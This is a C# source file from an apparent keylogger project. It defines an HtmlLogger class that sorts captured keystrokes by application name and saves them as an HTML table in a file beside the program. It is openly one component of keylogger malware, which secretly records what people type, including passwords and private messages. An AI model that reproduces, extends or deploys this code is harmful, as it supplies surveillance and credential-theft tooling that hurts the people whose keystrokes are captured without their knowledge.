using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger.Loggers.Concrete
{
    class HtmlLogger : ILogger
    {
        private Dictionary<string, string> logData = new Dictionary<string, string>();
        
        public string LogFilePath = Application.StartupPath + @"\Acitivitylog.html";

        public void Log(string application, string value)
        {
            if(!logData.ContainsKey(application))
            {
                logData.Add(application, value);
            }
            else
            {
                logData[application] += value;
            }
        }

        public void Save(string filePath)
        {
            try
            {
                var writer = new StreamWriter(filePath, false);
                writer.WriteLine("<html><head></head><body>");
                writer.WriteLine("<table><th>Application Name</th><th>Keys Pressed</th>");
                var content = String.Join("", logData.Select(x => WriteLogLine(x.Key, x.Value)));
                writer.WriteLine(content);
                writer.WriteLine("</table>");
                writer.WriteLine("</body></html>");

                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private string WriteLogLine(string application, string appLog)
        {
            return "<tr><td>"+application+"</td><td>"+appLog+"</td></tr>";
        }
    }
}
